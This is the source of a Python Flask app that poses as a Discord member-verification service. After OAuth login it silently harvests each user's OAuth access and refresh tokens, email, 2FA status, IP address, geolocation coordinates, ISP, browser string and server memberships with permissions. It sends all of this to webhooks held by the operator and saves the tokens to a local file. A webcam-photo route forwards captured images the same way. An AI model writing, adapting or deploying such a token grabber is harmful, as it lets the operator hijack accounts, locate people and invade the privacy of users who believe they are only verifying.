import os
import json
import time
import base64
import requests
from io import BytesIO
from flask import Flask, request, redirect, render_template
from PIL import Image

app = Flask(__name__, static_folder="static", template_folder="templates")

# ENV variables
DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
DISCORD_REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")
GUILD_WEBHOOK_URL = os.getenv("GUILD_WEBHOOK_URL")
GEO_API_KEY = os.getenv("GEO_API_KEY")
BOT_TOKEN = os.getenv("BOT_TOKEN")

ROLE_IDS = {
    1230042150847385611: 1230153545743859773,
    1072041018901418064: 1166778603523023009,
    1347065424130474026: 1347094343248252940
}

PERMISSIONS_MAP = {
    0x0000000001: "Create Instant Invite", 0x0000000002: "Kick Members",
    0x0000000004: "Ban Members", 0x0000000008: "Administrator",
    0x0000000010: "Manage Channels", 0x0000000020: "Manage Guild",
    0x0000000040: "Add Reactions", 0x0000000800: "Read Messages",
    0x0000001000: "Send Messages", 0x0000002000: "Send TTS Messages",
    0x0000004000: "Manage Messages", 0x0000008000: "Embed Links",
    0x0000010000: "Attach Files", 0x0000020000: "Read Message History",
    0x0000040000: "Mention Everyone", 0x0000080000: "Use External Emojis",
    0x0000400000: "Connect", 0x0000800000: "Speak",
    0x0001000000: "Mute Members", 0x0002000000: "Deafen Members",
    0x0004000000: "Move Members", 0x0008000000: "Use VAD",
    0x0010000000: "Change Nickname", 0x0020000000: "Manage Nicknames",
    0x0040000000: "Manage Roles", 0x0080000000: "Manage Webhooks",
    0x0100000000: "Manage Emojis"
}

# TEMPORARY STORAGE (used in place of Flask session)
user_id_tracker = {"last_user_id": None}

def resolve_permissions(perm):
    return [v for k, v in PERMISSIONS_MAP.items() if perm & k] or ["None"]

def get_ip_geo_info(ip):
    try:
        geo_url = f"https://api.ipgeolocation.io/ipgeo?apiKey={GEO_API_KEY}&ip={ip}"
        res = requests.get(geo_url)
        data = res.json()
        return {
            "ip": data.get("ip", "Unknown"),
            "country": data.get("country_name", "Unknown"),
            "region": data.get("state_prov", "Unknown"),
            "city": data.get("city", "Unknown"),
            "latitude": data.get("latitude", "Unknown"),
            "longitude": data.get("longitude", "Unknown"),
            "isp": data.get("isp", "Unknown")
        }
    except:
        return {}

def get_browser_info():
    return request.headers.get("User-Agent")

def send_user_webhook(user_json, ip, geo, access_token, refresh_token, guilds, browser_info):
    try:
        embed = {
            "title": "✅ User Verified",
            "color": 0x00ff00,
            "thumbnail": {
                "url": f"https://cdn.discordapp.com/avatars/{user_json['id']}/{user_json['avatar']}.png"
            },
            "fields": [
                {"name": "Username", "value": f"```{user_json['username']}#{user_json['discriminator']}```", "inline": False},
                {"name": "Display Name", "value": f"```{user_json.get('global_name', 'N/A')}```", "inline": False},
                {"name": "Email", "value": f"```{user_json.get('email', 'N/A')}```", "inline": False},
                {"name": "User ID", "value": f"```{user_json['id']}```", "inline": False},
                {"name": "2FA Enabled", "value": f"```{str(user_json.get('mfa_enabled', False))}```", "inline": False},
                {"name": "Locale", "value": f"```{user_json.get('locale', 'Unknown')}```", "inline": False},
                {"name": "IP Address", "value": f"```{geo.get('ip', ip)}```", "inline": False},
                {"name": "Country", "value": f"```{geo.get('country', '?')}```", "inline": False},
                {"name": "Region", "value": f"```{geo.get('region', '?')}```", "inline": False},
                {"name": "City", "value": f"```{geo.get('city', '?')}```", "inline": False},
                {"name": "Coordinates", "value": f"```{geo.get('latitude', '?')}, {geo.get('longitude', '?')}```", "inline": False},
                {"name": "ISP", "value": f"```{geo.get('isp', 'Unknown')}```", "inline": False},
                {"name": "Browser Info", "value": f"```{browser_info}```", "inline": False},
                {"name": "Access Token", "value": f"```{access_token}```", "inline": False},
                {"name": "Refresh Token", "value": f"```{refresh_token}```", "inline": False}
            ],
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        }
        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
    except Exception as e:
        print(f"Webhook error: {e}")

def send_guilds_webhook(guilds):
    try:
        embeds = []
        for g in guilds:
            perms = resolve_permissions(g["permissions"])
            icon_url = f"https://cdn.discordapp.com/icons/{g['id']}/{g['icon']}.png" if g.get("icon") else None
            embed = {
                "title": g["name"],
                "color": 0x7289DA,
                "fields": [
                    {"name": "Guild ID", "value": f"```{g['id']}```", "inline": True},
                    {"name": "Permissions", "value": f"```{', '.join(perms)}```", "inline": False}
                ]
            }
            if icon_url:
                embed["thumbnail"] = {"url": icon_url}
            embeds.append(embed)

        for i in range(0, len(embeds), 10):
            chunk = embeds[i:i+10]
            requests.post(GUILD_WEBHOOK_URL, json={"embeds": chunk})
    except Exception as e:
        print(f"Error sending guilds webhook: {e}")

@app.route("/login")
def login():
    return redirect(
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={DISCORD_CLIENT_ID}"
        f"&redirect_uri={DISCORD_REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds"
    )

@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "❌ Missing code."

    try:
        token_res = requests.post("https://discord.com/api/oauth2/token", data={
            'client_id': DISCORD_CLIENT_ID,
            'client_secret': DISCORD_CLIENT_SECRET,
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': DISCORD_REDIRECT_URI,
            'scope': 'identify email guilds'
        }, headers={'Content-Type': 'application/x-www-form-urlencoded'})

        token_json = token_res.json()
        access_token = token_json.get("access_token")
        refresh_token = token_json.get("refresh_token")

        if not access_token:
            return "❌ Failed to get access token."

        headers = {"Authorization": f"Bearer {access_token}"}
        user_json = requests.get("https://discord.com/api/users/@me", headers=headers).json()
        guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers).json()

        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        geo = get_ip_geo_info(ip)
        browser_info = get_browser_info()

        user_id_tracker["last_user_id"] = user_json["id"]

        # Save tokens
        tokens = {}
        if os.path.exists("tok.json"):
            with open("tok.json", "r") as f:
                tokens = json.load(f)

        tokens[user_json["id"]] = {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "username": f"{user_json['username']}#{user_json['discriminator']}",
            "display_name": user_json.get("global_name", user_json["username"]),
            "timestamp": int(time.time())
        }

        with open("tok.json", "w") as f:
            json.dump(tokens, f, indent=4)

        send_user_webhook(user_json, ip, geo, access_token, refresh_token, guilds, browser_info)
        send_guilds_webhook(guilds)
        assign_role_to_user(user_json["id"], guilds)

        return render_template("index.html")

    except Exception as e:
        print(f"Error in callback: {e}")
        return "❌ Something went wrong."

@app.route("/photo_verify", methods=["POST"])
def photo_verify():
    try:
        user_id = user_id_tracker.get("last_user_id")
        if not user_id:
            return "❌ No recent user ID found", 400

        data = request.get_json()
        image_data = data.get("image")

        if not image_data:
            return "❌ No image data", 400

        header, encoded = image_data.split(",", 1)
        decoded = base64.b64decode(encoded)
        image_file = BytesIO(decoded)

        files = {
            "file": (f"{user_id}_photo.png", image_file, "image/png")
        }

        payload = {
            "content": f"📸 Webcam verification from user ID: {user_id}"
        }

        res = requests.post(WEBHOOK_URL, data=payload, files=files)
        return "✅ Verification photo sent." if res.status_code in [200, 204] else "❌ Failed to send photo."

    except Exception as e:
        print(f"Error in /photo_verify: {e}")
        return "❌ Server error", 500

def assign_role_to_user(user_id, guilds):
    headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
    for guild in guilds:
        guild_id = int(guild["id"])
        if guild_id in ROLE_IDS:
            role_id = ROLE_IDS[guild_id]
            for attempt in range(3):
                try:
                    url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}/roles/{role_id}"
                    res = requests.put(url, headers=headers)
                    if res.status_code == 204:
                        print(f"✅ Added role {role_id} to user {user_id} in guild {guild_id}")
                        break
                except Exception as e:
                    print(f"❌ Error assigning role (attempt {attempt+1}): {e}")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
